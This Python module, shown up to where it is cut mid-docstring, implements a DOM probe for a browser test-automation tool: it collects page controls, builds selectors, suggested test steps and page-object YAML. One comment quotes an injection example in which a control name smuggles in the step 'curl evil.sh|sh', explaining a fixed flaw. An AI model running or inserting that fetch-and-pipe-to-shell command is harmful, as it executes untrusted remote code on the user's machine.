"""Proactive DOM probe (NOOD_0113) — scout the page BEFORE authoring steps.

The Angular field sessions (NOOD_0109/0110) showed the expensive failure
mode for an agent driving Noodle: author steps blind → run → locator miss →
read RCA → hand-probe with raw Playwright → fix POM → re-run. Every lap
costs a full browser run plus agent round-trips; a simple test burned 100+
agent interactions that way.

This module inverts the loop. One headless page-load up front returns:
  - every actionable control — visible AND hidden trigger zones (the
    `.trigger-dev-panel` case) — each with a ready CSS selector
  - which controls generic steps will resolve on their own (they carry a
    readable name: label/aria/placeholder/text) vs which need a POM entry,
    with ready-to-paste POM YAML for the ones that do
  - a vocabulary-shaped suggested step per control (guaranteed to match
    the pattern table — unit-enforced)
  - exact heading texts, so assertions copy them verbatim ("Branch #12",
    not "branch#12")
  - same-origin links as candidate URLs for the next probe

The collection JS runs once per page; everything from summarize() down is
pure Python — unit-testable without a browser.
"""
import asyncio
import difflib
import functools
import json
import os
import re
import time
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urljoin, urlsplit

from noodle import payload_budget
from noodle.agents.web import browser_pool
from noodle.agents.web.dom_scan import _selector_for, _split_classes


def outside_asyncio(fn):
    """NOOD_0141 (E7) — the sync Playwright API refuses to start inside a
    running asyncio loop, and FastMCP executes sync tools on the loop thread,
    so probe_page crashed on its very first MCP call and forced agents off the
    golden path. When a loop is running, execute the sync body in a fresh
    thread instead — identical contract, just doesn't raise."""
    @functools.wraps(fn)
    def wrapper(*args, **kwargs):
        try:
            asyncio.get_running_loop()
        except RuntimeError:
            return fn(*args, **kwargs)
        with ThreadPoolExecutor(max_workers=1) as ex:
            return ex.submit(fn, *args, **kwargs).result()
    return wrapper

# Walk cap. Unlike dom_scan's (NOOD_0199, tunable via NOODLE_DOM_SCAN_MAX,
# where any attribute — `class` included — makes an element count, so the cap
# is effectively a DOM-node count), this counter only advances for INTERACTIVE
# elements: the `continue` below rejects everything that isn't a real control.
# 3000 controls on one screen is not a shape real pages take, so this is a
# runaway guard rather than a limit anything meets.
# ponytail: raise if a real page buries its controls below the cap.
_MAX_ELEMENTS = 3000

_COLLECT_JS = """
() => {
  const controls = [], seen = new Set();
  const TAGS = new Set(['a', 'button', 'input', 'select', 'textarea']);
  const ROLES = new Set(['button', 'link', 'tab', 'menuitem', 'checkbox',
                         'radio', 'combobox', 'switch', 'textbox',
                         'searchbox', 'option']);
  // ponytail: attribute/class heuristic for hidden hitboxes — JS event
  // listeners are undetectable from a DOM walk; widen the regex if a real
  // page hides its trigger behind an unmatchable class.
  const TRIGGERISH = /trigger|toggle|hitbox|clickable|opener/i;
  // NOOD_0136 — walk the top document AND every OPEN shadow root: a web-
  // component app (one host wrapping everything) otherwise probes empty.
  // Playwright CSS pierces open shadow roots, so plain selectors still work;
  // the host chain rides along as scope metadata. Closed roots are invisible
  // to JS — heuristically suspected below, never guessed at.
  const roots = [];
  const gather = (root, chain) => {
    roots.push([root, chain]);
    for (const host of root.querySelectorAll('*'))
      if (host.shadowRoot) {
        const t = host.tagName.toLowerCase();
        gather(host.shadowRoot, chain.concat(host.id ? t + '#' + host.id : t));
      }
  };
  gather(document, []);
  // NOOD_0134 — custom combobox hosts, by GENERIC signal (ARIA role, a
  // custom-element tag suffix, a class token), never a vendor allowlist.
  // ponytail: widen HOST_TAG/HOST_CLS if a page names its widget oddly.
  const HOST_TAG = /-(dropdown|select|combobox)$/;
  const HOST_CLS = /(^|[\\s_-])(dropdown|combobox|select)([\\s_-]|$)/i;
  const hostish = n => {
    const role = (n.getAttribute('role') || '').toLowerCase();
    const cls = (typeof n.className === 'string') ? n.className : '';
    return role === 'combobox' || role === 'listbox' ||
      HOST_TAG.test(n.tagName.toLowerCase()) || HOST_CLS.test(cls);
  };
  // Vendor widgets nest (pos-dropdown > ng-select > input): once a host
  // matches, keep climbing while ancestors STILL match, so every inner part
  // resolves to the same outermost widget element instead of each layer
  // emitting its own duplicate control.
  const hostFor = el => {
    let n = el.parentElement, hops = 0, found = null;
    while (n && n !== document.body && hops++ < 6) {
      if (hostish(n)) found = n;
      else if (found) break;
      n = n.parentElement;
    }
    return found;
  };
  const labelFor = {};
  for (const [root] of roots)
    for (const lab of root.querySelectorAll('label[for]'))
      labelFor[lab.getAttribute('for')] = (lab.innerText || '').trim();
  outer:
  for (const [root, chain] of roots) {
  for (const el of root.querySelectorAll('*')) {
    if (controls.length >= %d) break outer;
    const tag = el.tagName.toLowerCase();
    const attr = n => el.getAttribute(n) || '';
    const role = attr('role').toLowerCase();
    const cls = (typeof el.className === 'string') ? el.className : '';
    const st = getComputedStyle(el);
    // cursor:pointer inherits — only the outermost pointer element is the
    // clickable region, not every child inside it.
    const parentPointer = el.parentElement &&
      getComputedStyle(el.parentElement).cursor === 'pointer';
    const r = el.getBoundingClientRect();
    const visible = !!(r.width || r.height) &&
      st.visibility !== 'hidden' && st.opacity !== '0';
    const interactive = TAGS.has(tag) || ROLES.has(role) ||
      el.hasAttribute('onclick') ||
      (st.cursor === 'pointer' && !parentPointer) ||
      TRIGGERISH.test(cls) || TRIGGERISH.test(el.id || '');
    if (!interactive || tag === 'html' || tag === 'body') continue;
    // NOOD_0134 — a custom combobox renders anonymous inner parts (a bare
    // typeahead <input>, an arrow <span>): nothing readable to name them by,
    // and their selectors are ambiguous ("input" = first input on the page).
    // Emit the WIDGET HOST instead — the same "outermost meaningful element"
    // instinct as parentPointer, extended to custom dropdown widgets. Its
    // text is left blank on purpose: host innerText is the live selected
    // value, so identity attrs (testid/e2e class) name it, and the blank
    // forces a POM entry with the stable host selector.
    const anonKind = tag === 'input'
      ? ['', 'text', 'search'].includes(attr('type').toLowerCase())
      : !(tag === 'a' && attr('href')) && !(visible && (el.innerText || '').trim());
    const anon = anonKind && !el.id && !attr('name') && !attr('aria-label') &&
      !attr('placeholder') && !attr('data-testid') && !attr('data-test-id') &&
      !attr('data-test') && !attr('data-qa') && !el.closest('label');
    const host = anon ? hostFor(el) : null;
    const node = host || el;
    const nattr = n => node.getAttribute(n) || '';
    const ntag = node.tagName.toLowerCase();
    let nvisible = visible;
    if (host) {
      const hr = host.getBoundingClientRect(), hst = getComputedStyle(host);
      nvisible = !!(hr.width || hr.height) &&
        hst.visibility !== 'hidden' && hst.opacity !== '0';
    }
    const id = node.id || '';
    const item = {
      tag: ntag, id,
      role: host ? (nattr('role').toLowerCase() || 'combobox') : role,
      type: nattr('type').toLowerCase(),
      name: nattr('name'),
      testid: nattr('data-testid') || nattr('data-test-id') ||
              nattr('data-test') || nattr('data-qa'),
      aria: nattr('aria-label'),
      title: nattr('title'),
      ph: nattr('placeholder'),
      alt: nattr('alt') ||
           ((node.querySelector('img[alt]') || {getAttribute: () => ''})
             .getAttribute('alt') || ''),
      cls: (typeof node.className === 'string') ? node.className : '',
      href: ntag === 'a' ? nattr('href') : '',
      // NOOD_0145 — an editable control's live value is NOT DOM text: runtime
      // locators resolve labels/roles/placeholders/visible text, never values,
      // so a value-derived name can never resolve at run time. Only button-like
      // inputs render their caption through value; a textarea's innerText IS
      // its value, so it contributes no text either.
      text: (nvisible && !host) ? (
        ntag === 'input'
          ? (['button', 'submit', 'reset'].includes(nattr('type').toLowerCase())
              ? (node.value || '') : '')
          : ntag === 'textarea' ? ''
          : (node.innerText || node.value || '')
      ).trim().slice(0, 60) : '',
      label: labelFor[id] || (node.closest('label') || {innerText: ''}).innerText.trim().slice(0, 60),
      visible: nvisible,
      expanded: nattr('aria-expanded'),
      haspopup: nattr('aria-haspopup'),
      shadow: chain.join(' > '),
      // NOOD_0168 — landmark provenance: a control inside nav/header/footer
      // chrome can never be a search RESULT, however card-shaped the strip
      // is. closest() stops at the shadow boundary — best-effort belt over
      // the persistence heuristic in build_result_items, not a replacement.
      chrome: !!node.closest('nav,header,footer,[role="navigation"],' +
                             '[role="banner"],[role="contentinfo"],' +
                             '[aria-label*="readcrumb"]'),
    };
    // NOOD_0136 — aria/role/ph in the key: Flutter/ARIA-only semantics nodes
    // are identical in tag/cls/text and used to dedupe into one control.
    const key = JSON.stringify([item.tag, item.id, item.name, item.testid,
                                item.cls, item.text, item.aria, item.role,
                                item.ph]);
    if (seen.has(key)) continue;
    seen.add(key);
    controls.push(item);
  }
  }
  const headings = [];
  for (const [root] of roots) {
    for (const h of root.querySelectorAll('h1,h2,h3,h4,h5,h6,[role="heading"]')) {
      const t = (h.innerText || '').trim().slice(0, 80);
      const r = h.getBoundingClientRect();
      if (t && (r.width || r.height) && !headings.includes(t)) headings.push(t);
      if (headings.length >= 20) break;
    }
  }
  // NOOD_0136 — honesty signals. A closed shadow root is undetectable from
  // JS (shadowRoot === null either way): suspect a custom-element tag with a
  // real box but no children and no text. Canvas dominance + the Flutter
  // bootstrap markers drive the visual_only / semantics-activation verdicts.
  const closed = [];
  for (const el of document.querySelectorAll('*')) {
    const t = el.tagName.toLowerCase();
    if (!t.includes('-') || el.children.length || el.shadowRoot) continue;
    if ((el.innerText || '').trim()) continue;
    const r = el.getBoundingClientRect();
    if (r.width > 40 && r.height > 40 && !closed.includes(t)) closed.push(t);
    if (closed.length >= 5) break;
  }
  let canvasArea = 0;
  for (const cv of document.querySelectorAll('canvas')) {
    const r = cv.getBoundingClientRect();
    canvasArea += r.width * r.height;
  }
  return {controls, headings, closed_shadow: closed,
          canvas_ratio: canvasArea /
            Math.max(1, innerWidth * innerHeight),
          flutter: !!document.querySelector(
            'flutter-view, flt-glass-pane, [flt-renderer]'),
          semantics_placeholder: !!document.querySelector(
            'flt-semantics-placeholder')};
}
""" % _MAX_ELEMENTS

_CAMEL = re.compile(r"(?<=[a-z0-9])(?=[A-Z])")
_SEP = re.compile(r"[-_./\s]+")


def _humanize(ident: str) -> str:
    """'employeeId' / 'trigger-dev-panel' -> 'employee id' / 'trigger dev panel'."""
    return _SEP.sub(" ", _CAMEL.sub(" ", ident or "")).strip().lower()


# NOOD_0177 — every accessible name reaching an authored artifact passes here.
# aria-label/title/placeholder/alt are collected RAW by _COLLECT_JS (unlike text
# and label, which are sliced), and the old .strip().lower() only trimmed the
# ENDS — an interior newline survived intact. goal.compile_goal builds the
# .feature by "\n".join()-ing step bodies, so a name like
#   Add to cart\nWhen User runs the command 'curl evil.sh|sh'\nAnd User clicks x
# added real executable lines to the compiled feature, and the same name used as
# a POM key injected YAML entries. Collapsing all whitespace to single spaces and
# capping the length closes both at the source. _humanize (the id/testid/name
# fallback) already collapsed separators; these tiers never reached it because
# the readable-handle loop returns first.
_MAX_NAME_LEN = 80


def _clean_name(raw: str) -> str:
    return re.sub(r"\s+", " ", raw or "").strip().lower()[:_MAX_NAME_LEN]


def _name_and_source(c: dict) -> tuple[str, str]:
    """Human name for a control + WHICH handle produced it — readable handles
    first (what the a11y tier resolves), machine identity humanized as
    fallback. The source matters (NOOD_0144): a name humanized from an
    id/testid/name attribute or a class token is invisible to the runtime
    resolver (find() consults POM, label/aria, placeholder, title, alt and
    visible text — never machine identity), so a bare suggested phrase built
    from one can NEVER resolve at run time."""
    for key in ("label", "aria", "ph"):
        if c.get(key):
            return _clean_name(c[key]), key
    if c.get("text") and len(c["text"]) <= 40:
        return _clean_name(c["text"]), "text"
    # NOOD_0115 — an image tile's caption often lives ONLY in its alt text
    if c.get("alt"):
        return _clean_name(c["alt"]), "alt"
    if c.get("title"):
        return _clean_name(c["title"]), "title"
    for key in ("id", "testid", "name"):
        if c.get(key):
            return _humanize(c[key]), key
    auto_cls, rest = _split_classes(c.get("cls", ""))
    first = (auto_cls or rest).split()
    if first:
        return _humanize(first[0]), "cls"
    return c.get("tag", "element"), "tag"


# Name sources the runtime resolver never consults — a phrase built from one
# must ship a POM selector or it is a guaranteed red run (NOOD_0144).
_MACHINE_SOURCES = ("id", "testid", "name", "cls", "tag")


def _name_for(c: dict) -> str:
    return _name_and_source(c)[0]


def _selector(c: dict) -> str:
    """dom_scan's attribute selector, with two cases it never had to handle:
    class-only elements get a ~= token match (full class-attribute equality
    breaks when framework state classes flip, the NOOD_0109 lesson), and
    attribute-less elements (<button>Sign In</button>) fall back to text."""
    if any(c.get(k) for k in ("id", "testid", "name", "aria", "title", "ph")):
        return _selector_for(c)
    classes = (c.get("cls") or "").split()
    if classes:
        # NOOD_0134 — an automation-prefixed token (e2e_*/qa-*) beats whatever
        # class happens to come first: it's identity, not styling state.
        auto_cls, _ = _split_classes(c["cls"])
        token = (auto_cls.split() or classes)[0]
        return '%s[class~="%s"]' % (c["tag"], token.replace('"', '\\"'))
    if c.get("text"):
        return f'text={c["text"]}'
    # NOOD_0119 — alt-only anchor tiles otherwise all collapse to the bare "a"
    # selector and dedup keeps only one (driver 2: four homepage tiles seen as
    # one). href distinguishes them; alt is the next-best discriminator.
    if c.get("tag") == "a" and c.get("href"):
        return f'a[href="{c["href"]}"]'
    if c.get("alt"):
        return f'{c.get("tag", "*")}[alt="{c["alt"]}"]'
    return c.get("tag", "*")


def _yaml_str(value: str) -> str:
    """A YAML-safe single-quoted scalar. Selectors routinely carry double
    quotes (`[id="x"]`, `[class~="y"]`) which break a double-quoted YAML
    value; a single-quoted scalar needs no escaping for them (only embedded
    single quotes, which double)."""
    return "'" + value.replace("'", "''") + "'"


# NOOD_0126 — the POM scoping trap, baked into every suggestion. A per-page
# `<stem>_pom.yaml` with no `match:` only applies to URLs containing its
# filename stem, so a login POM the author names `login_pom.yaml` silently
# never activates once the scenario navigates past /login. Emitting `match: {}`
# (folder-global) up front makes the file active on every page the scenario
# visits — the review-flagged failure that cost six browser runs on a POM that
# never scoped. The author narrows it to one page only if they mean to.
def _match_header() -> list[str]:
    return ["match: {}   # active on EVERY url (needed when a scenario spans "
            "several pages, e.g. login → post-login).",
            "            # Narrow to one page with: match: {url_contains: \"/path\"}"]


def _kind(c: dict) -> str:
    tag, typ, role = c.get("tag", ""), c.get("type", ""), c.get("role", "")
    if tag == "select" or role in ("combobox", "listbox"):
        return "dropdown"
    if typ in ("checkbox", "radio") or role in ("checkbox", "radio", "switch"):
        return "toggle"
    if tag == "textarea" or role in ("textbox", "searchbox") or (
            tag == "input" and typ not in ("button", "submit", "reset", "image")):
        return "field"
    if tag == "a" or role == "link":
        return "link"
    return "button"


def _needs_pom(c: dict) -> bool:
    """True when generic step phrasing has nothing readable to find this by:
    hidden, or no label/aria/placeholder/text/title. Mirrors ground.py's
    philosophy — don't POM what resolves live."""
    if not c.get("visible"):
        return True
    return not any(c.get(k) for k in ("label", "aria", "ph", "text", "title"))


def _step_for(kind: str, name: str) -> str:
    if kind == "field":
        return f'enters "<value>" in the "{name}" field'
    if kind == "dropdown":
        return f'selects "<option>" from "{name}"'
    return f'clicks "{name}"'


# NOOD_0179 — every suggested step is one of these three sentences with a name
# substituted, so a 40-step list re-sends the sentence 40 times. Brief mode
# sends each template ONCE and the names alone.
STEP_TEMPLATES = {
    "click": 'clicks "<name>"',
    "field": 'enters "<value>" in the "<name>" field',
    "dropdown": 'selects "<option>" from "<name>"',
}


def _template_key(kind: str | None) -> str:
    return kind if kind in ("field", "dropdown") else "click"


def _keeps_exact_step(c: dict) -> bool:
    """Rows whose phrasing is load-bearing keep their verbatim step.

    A machine-named or POM-needing control resolves by the exact wording the
    probe proved; re-deriving it from a template is how "use the suggested step
    as-is" turns into a run-time locator miss (the playbook rule exists because
    that happened).
    """
    return bool(c.get("needs_pom") or c.get("machine_name")
                or c.get("caption_attr_only"))


# NOOD_0145 — input types whose `value` is the rendered caption (accessible
# name), not user-editable data. Everything else keeps its value out of `text`.
_CAPTION_VALUE_TYPES = ("button", "submit", "reset", "image")


def _value_masquerades_as_text(c: dict) -> bool:
    """True when a collected `text` can only be the control's live VALUE, not
    DOM text: an <input> has no inner text at all, and a <textarea>'s inner
    text IS its value. Runtime locators resolve labels/roles/placeholders/
    visible text — never values — so a value-derived name fails every run
    while looking perfectly readable in the probe (the NOOD_0144 machine-name
    fix could not catch it: source read as "text"). Button-like inputs are the
    exception: their value is the rendered caption. Enforced here in pure
    Python so the contract holds whatever a collector sends."""
    tag = c.get("tag")
    if tag == "textarea":
        return True
    return tag == "input" and \
        (c.get("type") or "").lower() not in _CAPTION_VALUE_TYPES


def summarize(raw: dict, url: str = "", title: str = "") -> dict:
    """Pure-Python shaping of one page's collected DOM into the probe payload."""
    controls, seen = [], set()
    for c in raw.get("controls", []):
        # NOOD_0145 — never let an editable value pose as visible text: the
        # control then falls back to machine identity (id/testid/class) and
        # earns a POM entry, instead of a value-named phrase that can't resolve.
        if c.get("text") and _value_masquerades_as_text(c):
            c = {**c, "text": ""}
        selector = _selector(c)
        if selector in seen:
            continue
        seen.add(selector)
        kind = _kind(c)
        name, name_src = _name_and_source(c)
        # NOOD_0115 — the label exists ONLY as an attribute (alt/aria-label/
        # title), no visible text node: a plain "should see"/"waits until
        # visible" text step can't match it, so flag it and ALWAYS emit a POM
        # entry, even though find()-driven steps resolve it via accessibility.
        attr_only = bool(not c.get("text") and not c.get("label")
                         and (c.get("alt") or c.get("aria") or c.get("title")))
        # NOOD_0144 — a machine-sourced name (humanized id/testid/class) can
        # slip past _needs_pom when the control carries a >40-char text node:
        # the phrase looked copy-ready but resolves to NOTHING at run time.
        # Machine-named ⇒ always emit the POM entry; the phrase then resolves
        # via the POM key instead of a handle find() never consults.
        machine_named = name_src in _MACHINE_SOURCES
        entry = {
            "kind": kind,
            "name": name,
            "selector": selector,
            "visible": bool(c.get("visible")),
            "needs_pom": _needs_pom(c) or machine_named,
            "step": _step_for(kind, name),
        }
        if machine_named:
            entry["machine_name"] = True
        if attr_only:
            entry["caption_attr_only"] = True
        # NOOD_0141 — locale-proof mutating signal for the auto-open/discover
        # safety gates: a submit control mutates in any language.
        if c.get("type") == "submit":
            entry["submit"] = True
        # NOOD_0212 — the link's destination. It was scraped (the selector
        # builder above uses it) but never carried onto the emitted control,
        # so every consumer downstream read None on every link: NOOD_0208's
        # navigation-shaped demotion could not fire, and two chrome links
        # sharing a name could not be shown to share a destination.
        if c.get("tag") == "a" and (c.get("href") or "").strip():
            entry["href"] = c["href"].strip()
        # NOOD_0136 — scope + discovery signals, only when informative: shadow
        # host chain (selectors still work — Playwright pierces open roots),
        # aria-expanded state and tab/menu roles feed --discover candidates.
        if c.get("shadow"):
            entry["scope"] = f'shadow:{c["shadow"]}'
        if c.get("expanded") in ("true", "false"):
            entry["expanded"] = c["expanded"]
        if c.get("haspopup") and c.get("haspopup") != "false":
            entry["haspopup"] = c["haspopup"]
        # NOOD_0169 — landmark provenance rides into the summary so the
        # mutation-prerequisite gate can refuse global chrome semantically.
        if c.get("chrome"):
            entry["chrome"] = True
        if c.get("role") in ("tab", "menuitem"):
            entry["role"] = c["role"]
        controls.append(entry)
        if entry["needs_pom"] or attr_only:
            if c.get("alt") and not c.get("aria"):
                lines = [f'{name}:', f'  alt_text: {_yaml_str(c["alt"])}']
            else:
                lines = [f'{name}:', f'  css: {_yaml_str(selector)}']
            entry["pom"] = lines          # W3a — tile slice reads it back

    # NOOD_0141 (P2-1) — hidden/visible twins. Retail sites render a hidden
    # desktop search input beside the visible one; the hidden twin used to win
    # the POM suggestion on DOM order, and the pasted key then resolved an
    # unfillable element (one wasted red run). When a hidden needs-POM control
    # shares its name with a VISIBLE control, the suggested POM entry now
    # carries the visible twin's selector; the hidden control stays listed,
    # flagged hidden_twin.
    visible_sel = {}
    for e in controls:
        if e["visible"] and e["name"] not in visible_sel:
            visible_sel[e["name"]] = e["selector"]
    for e in controls:
        twin = None if e["visible"] or "pom" not in e else visible_sel.get(e["name"])
        if twin and twin != e["selector"]:
            e["hidden_twin"] = True
            e["pom"] = [f'{e["name"]}:', f'  css: {_yaml_str(twin)}']

    pom_body, named = [], set()
    for e in controls:
        if "pom" not in e or e["name"] in named:
            continue
        named.add(e["name"])
        pom_body += e["pom"]
    if pom_body:
        head = (f"# Page object — probed from {url}" if url
                else "# Page object — probe suggestions")
        pom_yaml = "\n".join([head, *_match_header(), *pom_body]) + "\n"
    else:
        pom_yaml = ""

    next_pages, seen_href = [], set()
    origin = urlsplit(url)[:2] if url else None
    for c in raw.get("controls", []):
        href = (c.get("href") or "").strip()
        if not href or href.startswith(("javascript:", "mailto:", "tel:", "#")):
            continue
        absolute = urljoin(url, href).split("#")[0] if url else href
        if origin and urlsplit(absolute)[:2] != origin:
            continue
        if absolute and absolute != url and absolute not in seen_href:
            seen_href.add(absolute)
            next_pages.append(absolute)
    return {"url": url, "title": title, "controls": controls,
            "pom_yaml": pom_yaml, "headings": raw.get("headings", []),
            "next_pages": next_pages[:15]}


# NOOD_0141 — locale-tolerant number reading. "1,234.56" (US), "1.234,56"
# (de/es/it), "1 234,56" (fr, incl. nbsp) all parse; rules: spaces/nbsp are
# thousands; with both '.' and ',' the LAST is the decimal mark; a lone ','
# is decimal only with 1-2 trailing digits; a lone '.' repeats → thousands,
# else stays decimal (US default — "4.5 stars"). Pure — shared by
# actions.read_number and goal._observed_count.
_NUM_TOKEN_RE = re.compile(
    r"-?\d{1,3}(?:[\u00a0 ]\d{3})+(?:,\d+)?|-?\d[\d.,]*\d|-?\d")


def parse_number(raw: str) -> float | None:
    """First number in `raw`, US- and European-format tolerant. None when no
    number is present or it doesn't parse."""
    m = _NUM_TOKEN_RE.search(raw or "")
    if not m:
        return None
    s = m.group().replace("\u00a0", "").replace(" ", "")
    if "." in s and "," in s:
        dec = "." if s.rfind(".") > s.rfind(",") else ","
        thou = "," if dec == "." else "."
        s = s.replace(thou, "").replace(dec, ".")
    elif "," in s:
        head, _, tail = s.rpartition(",")
        if s.count(",") == 1 and 1 <= len(tail) <= 2:
            s = head + "." + tail            # decimal comma: 3,5
        else:
            s = s.replace(",", "")           # thousands: 1,234 / 1,234,567
    elif s.count(".") > 1:
        s = s.replace(".", "")               # thousands: 1.234.567
    try:
        return float(s)
    except ValueError:
        return None


# NOOD_0117 — the "NN results" summary element on a results page. Innermost
# visible element whose own text carries the count; the number is parsed in
# Python. ponytail: widen the noun list if a real site words its count oddly.
# NOOD_0141 — high-frequency locale nouns (de/fr/es/it/pt/nl) so non-English
# results pages get the stable summary-count assertion too.
_COUNT_WORDS = (r"(results?|items?|products?|matches|listings?|entries"
                r"|résultats?|ergebnisse?|treffer|resultados?|productos"
                r"|artículos|risultati|prodotti|resultaten|artikelen?"
                r"|produits|articles|éléments|producten)")
_COUNT_RE = re.compile(r"\b(\d[\d.,\u00a0 ]*\d|\d)\s+" + _COUNT_WORDS + r"\b",
                       re.I)
_COUNT_JS = """
() => {
  const rx = /\\b\\d[\\d.,\\u00a0 ]*\\s+%s\\b/i;
  for (const el of document.querySelectorAll(
      'h1,h2,h3,p,span,div,output,[role="status"]')) {
    const t = (el.innerText || '').trim();
    if (!t || t.length > 80 || !rx.test(t)) continue;
    const r = el.getBoundingClientRect();
    if (!(r.width || r.height)) continue;
    let inner = false;
    for (const c of el.children)
      if (rx.test((c.innerText || '').trim())) { inner = true; break; }
    if (inner) continue;
    const attr = n => el.getAttribute(n) || '';
    return {text: t, tag: el.tagName.toLowerCase(), id: el.id || '',
            testid: attr('data-testid') || attr('data-test-id') ||
                    attr('data-test') || attr('data-qa'),
            cls: (typeof el.className === 'string') ? el.className : ''};
  }
  return null;
}
""" % _COUNT_WORDS


# NOOD_0136 — mutation settling upgraded from the NOOD_0135 element-count/
# text-length fingerprint to a real MutationObserver: attribute-only state
# flips (aria-expanded, class, value, disabled) and canvas repaint wrappers
# changed nothing the old hash could see. Armed BEFORE the action; _settle
# waits for the first mutation, then a short stable window.
_ARM_JS = """
() => {
  if (window.__noodleMo) window.__noodleMo.disconnect();
  const s = {n: 0, last: Date.now()};
  const mo = new MutationObserver(muts => { s.n += muts.length; s.last = Date.now(); });
  mo.observe(document.documentElement || document,
             {subtree: true, childList: true, characterData: true,
              attributes: true});
  window.__noodleMo = mo;
  window.__noodleMut = s;
  return true;
}
"""


def _arm(page):
    """Install the settle observer BEFORE a reveal action. Returns a truthy
    token, or None when the page can't be scripted (mid-navigation) — _settle
    then uses navigation mode."""
    try:
        return page.evaluate(_ARM_JS)
    except Exception:
        return None


def _timings_on() -> bool:
    """NOOD_0179 — NOODLE_PROBE_TIMINGS=1 adds settle-path debug keys. Off by
    default: the payload budget is the scarce resource, not the debug detail."""
    return os.getenv("NOODLE_PROBE_TIMINGS", "").strip().lower() in ("1", "true", "yes")


def _settle_initial(page, timeout_ms: int) -> str:
    """NOOD_0179 — the settle after goto, observer-driven instead of a fixed
    network-idle ceiling. Returns the path taken (debug only).

    Navigation mode paid `wait_for_load_state("networkidle", timeout=3000)` on
    EVERY initial load. Analytics-chatty pages — most retail sites — never go
    network-idle at all, so that was a flat 3 s per URL spent proving nothing.
    A page whose DOM has stopped changing is settled regardless of what its
    beacons are still doing, so watch the DOM and keep only a short network
    belt for the pages that fetch without mutating.

    Standards only (MutationObserver, wait_for_function) — identical behaviour
    on chromium/firefox/webkit, no CDP, no engine branches. Never raises; any
    scripting failure falls back to the legacy navigation settle verbatim.
    """
    if os.getenv("NOODLE_PROBE_SETTLE", "").strip().lower() == "legacy":
        return _settle(page, timeout_ms)
    # (a) the Angular transitional-blank-body case, unchanged — a body with no
    # children means the framework hasn't rendered yet, whatever the network says.
    try:
        page.wait_for_function(
            "document.body && document.body.childElementCount > 0",
            timeout=timeout_ms)
    except Exception:
        pass
    if _arm(page) is None:
        return _settle(page, timeout_ms)        # can't script it — legacy
    path = "quiet"
    try:
        try:
            # (c) no mutation inside the ceiling ⇒ the page is static and
            # already settled. This is the common case that used to cost 3 s.
            page.wait_for_function(
                "() => window.__noodleMut && window.__noodleMut.n > 0",
                timeout=min(timeout_ms, 700))
            path = "mutation"
        except Exception:
            path = "quiet"
        if path == "mutation":
            # (d) something is rendering — wait for it to stop, bounded.
            try:
                page.wait_for_function(
                    "() => Date.now() - window.__noodleMut.last >= 250",
                    timeout=timeout_ms)
            except Exception:
                path = "timeout"
        try:
            page.evaluate(
                "() => window.__noodleMo && window.__noodleMo.disconnect()")
        except Exception:
            pass
    except Exception:
        return _settle(page, timeout_ms)
    # (e) the belt: a page that fetches without touching the DOM (data loaded
    # into a framework store, rendered on the next tick) shows no mutation yet
    # isn't ready. 1 s, not 3 — and only as a backstop.
    try:
        page.wait_for_load_state("networkidle", timeout=1000)
    except Exception:
        pass
    return path


def _settle(page, timeout_ms: int, armed=None,
            url_before: str | None = None, mutating: bool = False) -> str:
    """SPA settle — best-effort, never raises. Returns why it completed:
    'mutation' | 'no-change' | 'timeout' | 'navigation' (debug metadata).

    Navigation (armed=None): the Angular transitional-blank-body case — wait
    for body content, then a short network-quiet grace. Used after goto and
    search submits.

    Mutation (`armed` = pre-action _arm() token): wait for the observer's
    first mutation, then a 250 ms-quiet stable window, timeout as ceiling. A
    DOM-only reveal (panel, custom combobox) never pays the fixed 3 s
    network-idle wait. Falls back to navigation mode when the click actually
    navigated (page.url moved off `url_before`).

    `mutating=True` (NOOD_0156 follow-up): the clicked control is a
    state-changer (add to cart, save, submit) whose UI response rides a
    network round trip — the 1 s change-wait misread a WORKING add-to-cart
    as no-change and the confirmation drawer was never captured. Mutating
    clicks get a 5 s first-change window; plain reveals keep 1 s."""
    if armed is not None:
        try:
            if url_before is not None and page.url != url_before:
                armed = None                # real transition — full settle
        except Exception:
            armed = None
    if armed is not None:
        reason = "mutation"
        try:
            try:
                # ponytail: 1s cap on the change-wait — a reveal that changes
                # nothing shouldn't burn the whole probe budget waiting.
                # Mutating controls wait out a server round trip instead.
                page.wait_for_function(
                    "() => window.__noodleMut && window.__noodleMut.n > 0",
                    timeout=min(timeout_ms, 5000 if mutating else 1000))
            except Exception:
                reason = "no-change"
            if reason == "mutation":
                try:
                    page.wait_for_function(
                        "() => Date.now() - window.__noodleMut.last >= 250",
                        timeout=timeout_ms)
                except Exception:
                    reason = "timeout"
            page.evaluate("() => window.__noodleMo && window.__noodleMo.disconnect()")
            return reason
        except Exception:
            pass          # execution context destroyed — the action navigated
    try:
        page.wait_for_function(
            "document.body && document.body.childElementCount > 0",
            timeout=timeout_ms)
    except Exception:
        pass
    try:
        page.wait_for_load_state("networkidle", timeout=3000)
    except Exception:
        pass
    return "navigation"


# NOOD_0137 — armed via add_init_script BEFORE every navigation: wraps the
# permission-prompting APIs so a page that asks for geolocation/notifications
# on load leaves a flag the probe reports as a ready-made close/grant step.
_PERM_JS = """
(() => {
  try {
    window.__noodlePerm = {};
    const g = navigator.geolocation;
    if (g) for (const m of ['getCurrentPosition', 'watchPosition']) {
      const orig = g[m].bind(g);
      g[m] = (...a) => { window.__noodlePerm.geolocation = true; return orig(...a); };
    }
    if (window.Notification && Notification.requestPermission) {
      const orig = Notification.requestPermission.bind(Notification);
      Notification.requestPermission =
        (...a) => { window.__noodlePerm.notifications = true; return orig(...a); };
    }
  } catch (e) {}
})()
"""


def _perm_signals(page) -> list[str]:
    try:
        flags = page.evaluate("() => window.__noodlePerm || {}") or {}
        return sorted(k for k, v in flags.items() if v)
    except Exception:
        return []


def _dismiss_popups(page) -> int:
    """NOOD_0137 — close popups DURING the probe with the same sweep the
    engine runs at test time: the snapshot then shows the real page instead
    of the overlay, and the count feeds the popups signal + skeleton."""
    try:
        from noodle.agents.web.actions import _sweep_popups
        return _sweep_popups(page)
    except Exception:
        return 0


_NORM_RE = re.compile(r"[^a-z0-9]+")


def _norm_name(s: str) -> str:
    """Lowercase + collapse every non-alphanumeric run: 'Trigger-Dev-Panel',
    'trigger dev panel' and 'trigger_dev_panel' resolve identically. NOOD_0131
    — a hyphenated reveal name missing the space-normalized probed control
    cost the baseline an avoidable browser launch."""
    return _NORM_RE.sub(" ", (s or "").lower()).strip()


def _click_selector(known: list[dict], target: str) -> str:
    """Resolve a --click target against the controls probed so far — exact
    name first, then normalized-name match (exact, then substring either way);
    anything else passes through as a raw selector so
